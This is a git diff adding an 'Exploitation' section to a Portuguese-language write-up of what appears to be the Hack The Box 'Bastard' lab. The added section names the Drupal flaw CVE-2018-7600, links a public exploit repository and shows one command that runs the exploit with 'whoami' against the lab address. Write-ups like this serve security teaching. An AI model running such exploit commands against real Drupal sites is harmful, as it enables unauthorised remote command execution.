@@ -56,4 +56,16 @@ Uma busca rapida encontramos varias formas de explorar
 ![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/4.jpg)
 
 
+## Exploitation
+
+Encontrei um exploit interessante e precisamos testar **CVE-2018-7600**
+
+***reference*** https://github.com/pimps/CVE-2018-7600.git
+
+Realmente eh vulneravel
+
+`python drupa7-CVE-2018-7600.py -c whoami http://10.10.10.9/`
+
+![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/5.jpg)
+
 
